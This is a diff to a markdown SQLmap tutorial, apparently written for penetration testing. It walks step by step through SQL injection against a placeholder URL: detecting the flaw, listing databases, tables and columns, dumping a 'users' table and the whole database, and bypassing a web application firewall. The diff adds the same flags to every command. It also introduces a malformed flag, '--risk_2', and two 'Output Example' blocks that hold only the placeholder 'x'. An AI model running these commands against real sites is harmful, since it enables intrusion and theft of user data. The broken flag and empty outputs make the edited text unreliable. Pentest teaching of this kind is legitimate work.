@@ -71,29 +71,39 @@ SQLmap allows fine-tuning of tests using:
 
 ### **Phase 1: Vulnerability Identification**
 ```bash
-sqlmap -u "http://target.com/vuln_page?id=1" --batch
+sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk_2
 ```
 - `--batch`: Runs with default options without user interaction
 - Checks for basic error-based SQL injection
 
 ### **Phase 2: Database Enumeration**
 ```bash
-sqlmap -u "http://target.com/vuln_page?id=1" --dbs --level=3 --risk=2
+sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk=2 --dbs
 ```
 - `--dbs`: Lists all available databases
 - `--level=3`: Tests cookies and User-Agent headers
 - `--risk=2`: Includes time-based blind SQLi tests
 
+**Output Example**
+```
+x
+```
+
 ### **Phase 3: Table Discovery**
 ```bash
-sqlmap -u "http://target.com/vuln_page?id=1" -D customer_db --tables
+sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk=2 -D customer_db --tables
 ```
 - `-D`: Specifies the target database
 - `--tables`: Lists all tables in the specified database
 
+**Output Example**
+```
+x
+```
+
 ### **Phase 4: Column Extraction**
 ```bash
-sqlmap -u "http://target.com/vuln_page?id=1" -D customer_db -T users --columns
+sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk=2 -D customer_db -T users --columns
 ```
 - `-T`: Targets a specific table
 - `--columns`: Lists all columns in the specified table
@@ -104,7 +114,7 @@ sqlmap -u "http://target.com/vuln_page?id=1" -D customer_db -T users --columns
 
 ### **Step 1: Complete Data Dump**
 ```bash
-sqlmap -u "http://target.com/vuln_page?id=1" -D customer_db -T users --dump --dump-format=CSV
+sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk=2 -D customer_db -T users --dump --dump-format=CSV
 ```
 - `--dump`: Extracts all data from the table
 - `--dump-format=CSV`: Outputs results in CSV format
@@ -140,7 +150,7 @@ For complete forensic analysis during authorized penetration tests, SQLmap can e
 
 #### **Command for Full SQL Dump:**
 ```bash
-sqlmap -u "http://target.com/vuln_page?id=1" --dump-all --dump-format=SQL --output-dir=/path/to/save
+sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk=2 --dump-all --dump-format=SQL --output-dir=/path/to/save
 ```
 
 **Key Parameters:**
@@ -188,7 +198,7 @@ CREATE TABLE `inventory` (
 
 ### **Enhanced Command with Performance Options:**
 ```bash
-sqlmap -u "http://target.com/vuln_page?id=1" --dump-all --dump-format=SQL --threads=5 --output-dir=/safe/storage --flush-session
+sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk=2 --dump-all --dump-format=SQL --threads=5 --output-dir=/safe/storage --flush-session
 ```
 - `--threads=5`: Speeds up extraction using parallel processing
 - `--flush-session`: Clears previous session data for clean testing
@@ -240,7 +250,7 @@ sqlmap -u "http://target.com/vuln_page?id=1" --level=5 --risk=3 --threads=5
 
 ### **Bypassing WAFs**
 ```bash
-sqlmap -u "http://target.com/vuln_page?id=1" --tamper=space2comment
+sqlmap -u "http://target.com/vuln_page?id=1" --batch --level=3 --risk=2 --tamper=space2comment
 ```
 - `--tamper`: Modifies injection data to bypass filters
 
